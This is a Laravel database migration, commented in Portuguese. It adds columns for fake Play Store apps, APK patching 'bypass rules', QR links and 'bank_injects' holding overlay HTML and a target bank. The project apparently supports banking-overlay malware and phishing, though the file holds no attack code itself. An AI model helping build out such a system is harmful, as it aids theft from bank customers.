<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

return new class extends Migration
{
    public function up(): void
    {
        // PlayFake: metadados extraídos do APK (Fase 1)
        Schema::table('play_fake_apps', function (Blueprint $table) {
            if (!Schema::hasColumn('play_fake_apps', 'version_name')) {
                $table->string('version_name')->nullable()->after('package_name');
            }
            if (!Schema::hasColumn('play_fake_apps', 'version_code')) {
                $table->string('version_code')->nullable()->after('version_name');
            }
            if (!Schema::hasColumn('play_fake_apps', 'permissions')) {
                $table->text('permissions')->nullable()->after('file_size');
            }
            if (!Schema::hasColumn('play_fake_apps', 'debuggable')) {
                $table->boolean('debuggable')->default(false)->after('permissions');
            }
        });

        // BypassRule: colunas que o job/controller usam mas nunca foram criadas (Fase 2)
        Schema::table('bypass_rules', function (Blueprint $table) {
            if (!Schema::hasColumn('bypass_rules', 'apk_path')) {
                $table->string('apk_path', 2048)->nullable()->after('target_package');
            }
            if (!Schema::hasColumn('bypass_rules', 'output_path')) {
                $table->string('output_path', 2048)->nullable()->after('apk_path');
            }
            if (!Schema::hasColumn('bypass_rules', 'patch_applied')) {
                $table->string('patch_applied')->nullable()->after('log');
            }
        });

        // Templates: versionamento (Fase 4)
        Schema::table('templates', function (Blueprint $table) {
            if (!Schema::hasColumn('templates', 'version')) {
                $table->unsignedInteger('version')->default(1)->after('html');
            }
        });

        // QR: caminho do PNG gerado (Fase 4)
        Schema::table('qr_code_links', function (Blueprint $table) {
            if (!Schema::hasColumn('qr_code_links', 'qr_path')) {
                $table->string('qr_path')->nullable()->after('target_url');
            }
        });

        // BankInject: overlay/spec da injeção (Fase 3)
        Schema::table('bank_injects', function (Blueprint $table) {
            if (!Schema::hasColumn('bank_injects', 'overlay_html')) {
                $table->longText('overlay_html')->nullable()->after('inject_type');
            }
            if (!Schema::hasColumn('bank_injects', 'target_bank')) {
                $table->string('target_bank')->nullable()->after('bank_name');
            }
        });
    }

    public function down(): void
    {
        Schema::table('play_fake_apps', function (Blueprint $table) {
            foreach (['version_name', 'version_code', 'permissions', 'debuggable'] as $col) {
                if (Schema::hasColumn('play_fake_apps', $col)) {
                    $table->dropColumn($col);
                }
            }
        });
        Schema::table('bypass_rules', function (Blueprint $table) {
            foreach (['apk_path', 'output_path', 'patch_applied'] as $col) {
                if (Schema::hasColumn('bypass_rules', $col)) {
                    $table->dropColumn($col);
                }
            }
        });
        Schema::table('templates', function (Blueprint $table) {
            if (Schema::hasColumn('templates', 'version')) {
                $table->dropColumn('version');
            }
        });
        Schema::table('qr_code_links', function (Blueprint $table) {
            if (Schema::hasColumn('qr_code_links', 'qr_path')) {
                $table->dropColumn('qr_path');
            }
        });
        Schema::table('bank_injects', function (Blueprint $table) {
            foreach (['overlay_html', 'target_bank'] as $col) {
                if (Schema::hasColumn('bank_injects', $col)) {
                    $table->dropColumn($col);
                }
            }
        });
    }
};
